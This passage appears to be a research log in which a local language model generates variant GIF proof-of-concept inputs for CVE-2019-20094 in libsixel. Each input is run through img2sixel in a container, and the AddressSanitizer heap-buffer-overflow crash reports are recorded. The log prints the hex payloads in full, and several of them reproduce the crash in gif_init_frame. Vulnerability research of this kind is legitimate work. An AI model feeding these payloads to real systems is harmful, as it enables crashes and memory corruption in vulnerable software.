+    #4 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #5 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #6 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #7 0x7b1467b08c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /test/libsixel-1.8.4/src/fromgif.c:250:38 in gif_init_frame
+Shadow bytes around the buggy address:
+  0x0f6301cbd380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f6301cbd390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f6301cbd3a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f6301cbd3b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f6301cbd3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x0f6301cbd3d0: 00 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f6301cbd3e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f6301cbd3f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f6301cbd400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f6301cbd410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f6301cbd420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==7==ABORTING
+
+Waiting for crash detection...
+
+=== libsixel Output ===
+=================================================================
+==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7b140e629e9c at pc 0x00000054eded bp 0x7ffdf31a3500 sp 0x7ffdf31a34f8
+WRITE of size 1 at 0x7b140e629e9c thread T0
+    #0 0x54edec in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:250:38
+    #1 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #2 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #3 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #4 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #5 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #6 0x7b1467b08c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+    #7 0x41a439 in _start (/usr/local/bin/img2sixel+0x41a439)
+
+0x7b140e629e9c is located 0 bytes to the right of 58156700-byte region [0x7b140aeb3800,0x7b140e629e9c)
+allocated by thread T0 here:
+    #0 0x4da2f0 in malloc (/usr/local/bin/img2sixel+0x4da2f0)
+    #1 0x54e305 in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:239:42
+    #2 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #3 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #4 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #5 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #6 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #7 0x7b1467b08c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /test/libsixel-1.8.4/src/fromgif.c:250:38 in gif_init_frame
+Shadow bytes around the buggy address:
+  0x0f6301cbd380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f6301cbd390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f6301cbd3a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f6301cbd3b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f6301cbd3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x0f6301cbd3d0: 00 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f6301cbd3e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f6301cbd3f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f6301cbd400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f6301cbd410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f6301cbd420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==7==ABORTING
+
+
+Crash Detected: True
+Cleaning up...
+Container 'libsixel-container' is running. Stopping it...
+Added new row: [4, 'CVE-2019-20094', 'gif_init_frame', True, 'libsixel-1.8.4', '4749463839615ab7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b', '\n =================================================================\n==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7b140e629e9c at pc 0x00000054eded bp 0x7ffdf31a3500 sp 0x7ffdf31a34f8\nWRITE of size 1 at 0x7b140e629e9c thread T0\n    #0 0x54edec in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:250:38\n    #1 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22\n    #2 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18\n    #3 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18\n    #4 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14\n    #5 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22\n    #6 0x7b1467b08c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)\n    #7 0x41a439 in _start (/usr/local/bin/img2sixel+0x41a439)\n\n0x7b140e629e9c is located 0 bytes to the right of 58156700-byte region [0x7b140aeb3800,0x7b140e629e9c)\nallocated by thread T0 here:\n    #0 0x4da2f0 in malloc (/usr/local/bin/img2sixel+0x4da2f0)\n    #1 0x54e305 in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:239:42\n    #2 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22\n    #3 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18\n    #4 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18\n    #5 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14\n    #6 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22\n    #7 0x7b1467b08c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow /test/libsixel-1.8.4/src/fromgif.c:250:38 in gif_init_frame\nShadow bytes around the buggy address:\n  0x0f6301cbd380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0f6301cbd390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0f6301cbd3a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0f6301cbd3b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0f6301cbd3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n=>0x0f6301cbd3d0: 00 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0f6301cbd3e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0f6301cbd3f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0f6301cbd400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0f6301cbd410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0f6301cbd420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==7==ABORTING\n']
+Updated xlsx
+2026-01-14 12:52:24,598 - INFO - Sending request to Ollama with model: deepseek-r1:70b
+2026-01-14 12:52:56,131 - INFO - Request successful
+Extracted PoC codes: 4749463839615ab8c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b
+Cleaned Hex: 4749463839615ab8c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b
+Written as HEX → binary
+2026-01-14 12:52:56,132 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P4_org.fig
+2026-01-14 12:52:56,132 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P4.fig
+Docker image 'libsixel-new-img' built successfully.
+[INFO] Container 'libsixel-container' is already running.
+Running PoC...
+Generating test traffic...
+[ERROR] Command failed: img2sixel -I test-poc
+=================================================================
+==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7997bf49e49c at pc 0x00000054eded bp 0x7fffea95eb60 sp 0x7fffea95eb58
+WRITE of size 1 at 0x7997bf49e49c thread T0
+    #0 0x54edec in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:250:38
+    #1 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #2 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #3 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #4 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #5 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #6 0x79981900dc86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+    #7 0x41a439 in _start (/usr/local/bin/img2sixel+0x41a439)
+
+0x7997bf49e49c is located 0 bytes to the right of 81898652-byte region [0x7997ba683800,0x7997bf49e49c)
+allocated by thread T0 here:
+    #0 0x4da2f0 in malloc (/usr/local/bin/img2sixel+0x4da2f0)
+    #1 0x54e305 in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:239:42
+    #2 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #3 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #4 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #5 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #6 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #7 0x79981900dc86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /test/libsixel-1.8.4/src/fromgif.c:250:38 in gif_init_frame
+Shadow bytes around the buggy address:
+  0x0f3377e8bc40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f3377e8bc50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f3377e8bc60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f3377e8bc70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f3377e8bc80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x0f3377e8bc90: 00 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f3377e8bca0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f3377e8bcb0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f3377e8bcc0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f3377e8bcd0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f3377e8bce0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==7==ABORTING
+
+Waiting for crash detection...
+
+=== libsixel Output ===
+=================================================================
+==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7997bf49e49c at pc 0x00000054eded bp 0x7fffea95eb60 sp 0x7fffea95eb58
+WRITE of size 1 at 0x7997bf49e49c thread T0
+    #0 0x54edec in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:250:38
+    #1 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #2 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #3 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #4 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #5 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #6 0x79981900dc86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+    #7 0x41a439 in _start (/usr/local/bin/img2sixel+0x41a439)
+
+0x7997bf49e49c is located 0 bytes to the right of 81898652-byte region [0x7997ba683800,0x7997bf49e49c)
+allocated by thread T0 here:
+    #0 0x4da2f0 in malloc (/usr/local/bin/img2sixel+0x4da2f0)
+    #1 0x54e305 in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:239:42
+    #2 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #3 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #4 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #5 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #6 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #7 0x79981900dc86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /test/libsixel-1.8.4/src/fromgif.c:250:38 in gif_init_frame
+Shadow bytes around the buggy address:
+  0x0f3377e8bc40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f3377e8bc50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f3377e8bc60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f3377e8bc70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0f3377e8bc80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x0f3377e8bc90: 00 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f3377e8bca0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f3377e8bcb0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f3377e8bcc0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f3377e8bcd0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0f3377e8bce0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==7==ABORTING
+
+
+Crash Detected: True
+Cleaning up...
+Container 'libsixel-container' is running. Stopping it...
+Added new row: [5, 'CVE-2019-20094', 'gif_init_frame', True, 'libsixel-1.8.4', '4749463839615ab8c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b', '\n =================================================================\n==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7997bf49e49c at pc 0x00000054eded bp 0x7fffea95eb60 sp 0x7fffea95eb58\nWRITE of size 1 at 0x7997bf49e49c thread T0\n    #0 0x54edec in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:250:38\n    #1 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22\n    #2 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18\n    #3 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18\n    #4 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14\n    #5 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22\n    #6 0x79981900dc86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)\n    #7 0x41a439 in _start (/usr/local/bin/img2sixel+0x41a439)\n\n0x7997bf49e49c is located 0 bytes to the right of 81898652-byte region [0x7997ba683800,0x7997bf49e49c)\nallocated by thread T0 here:\n    #0 0x4da2f0 in malloc (/usr/local/bin/img2sixel+0x4da2f0)\n    #1 0x54e305 in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:239:42\n    #2 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22\n    #3 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18\n    #4 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18\n    #5 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14\n    #6 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22\n    #7 0x79981900dc86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow /test/libsixel-1.8.4/src/fromgif.c:250:38 in gif_init_frame\nShadow bytes around the buggy address:\n  0x0f3377e8bc40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0f3377e8bc50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0f3377e8bc60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0f3377e8bc70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0f3377e8bc80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n=>0x0f3377e8bc90: 00 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0f3377e8bca0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0f3377e8bcb0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0f3377e8bcc0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0f3377e8bcd0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0f3377e8bce0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==7==ABORTING\n']
+Updated xlsx
+2026-01-14 12:53:42,484 - INFO - Sending request to Ollama with model: deepseek-r1:70b
+2026-01-14 12:54:54,617 - INFO - Request successful
+Extracted PoC codes: 4749463839615aff7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b
+Cleaned Hex: 4749463839615aff7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b
+Looks like hex but failed to decode
+Written as plain text not binary
+2026-01-14 12:54:54,619 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P5_org.fig
+2026-01-14 12:54:54,619 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P5.fig
+Docker image 'libsixel-new-img' built successfully.
+[INFO] Container 'libsixel-container' is already running.
+Running PoC...
+Generating test traffic...
+[ERROR] Command failed: img2sixel -I test-poc
+stb_image error
+unknown image type
+
+Waiting for crash detection...
+
+=== libsixel Output ===
+stb_image error
+unknown image type
+
+
+Crash Detected: False
+Cleaning up...
+Container 'libsixel-container' is running. Stopping it...
+Added new row: [6, 'CVE-2019-20094', 'gif_init_frame', False, 'libsixel-1.8.4', '4749463839615aff7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b', '\n stb_image error\nunknown image type\n']
+Updated xlsx
+2026-01-14 12:55:40,404 - INFO - Sending request to Ollama with model: deepseek-r1:70b
+2026-01-14 12:56:12,090 - INFO - Request successful
+Extracted PoC codes: 4749463839615a0c0d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b
+Cleaned Hex: 4749463839615a0c0d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b
+Looks like hex but failed to decode
+Written as plain text not binary
+2026-01-14 12:56:12,091 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P6_org.fig
+2026-01-14 12:56:12,092 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P6.fig
+Docker image 'libsixel-new-img' built successfully.
+[INFO] Container 'libsixel-container' is already running.
+Running PoC...
+Generating test traffic...
+[ERROR] Command failed: img2sixel -I test-poc
+stb_image error
+unknown image type
+
+Waiting for crash detection...
+
+=== libsixel Output ===
+stb_image error
+unknown image type
+
+
+Crash Detected: False
+Cleaning up...
+Container 'libsixel-container' is running. Stopping it...
+Added new row: [7, 'CVE-2019-20094', 'gif_init_frame', False, 'libsixel-1.8.4', '4749463839615a0c0d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b', '\n stb_image error\nunknown image type\n']
+Updated xlsx
+2026-01-14 12:56:57,986 - INFO - Sending request to Ollama with model: deepseek-r1:70b
+2026-01-14 12:57:47,175 - INFO - Request successful
+Extracted PoC codes: 4749463839615ab7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edc
+Cleaned Hex: 4749463839615ab7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edc
+Written as HEX → binary
+2026-01-14 12:57:47,176 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P7_org.fig
+2026-01-14 12:57:47,176 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P7.fig
+Docker image 'libsixel-new-img' built successfully.
+[INFO] Container 'libsixel-container' is already running.
+Running PoC...
+Generating test traffic...
+[ERROR] Command failed: img2sixel -I test-poc
+=================================================================
+==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x77ee42e29e9c at pc 0x00000054eded bp 0x7ffd71a9a2c0 sp 0x7ffd71a9a2b8
+WRITE of size 1 at 0x77ee42e29e9c thread T0
+    #0 0x54edec in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:250:38
+    #1 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #2 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #3 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #4 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #5 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #6 0x77ee9c328c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
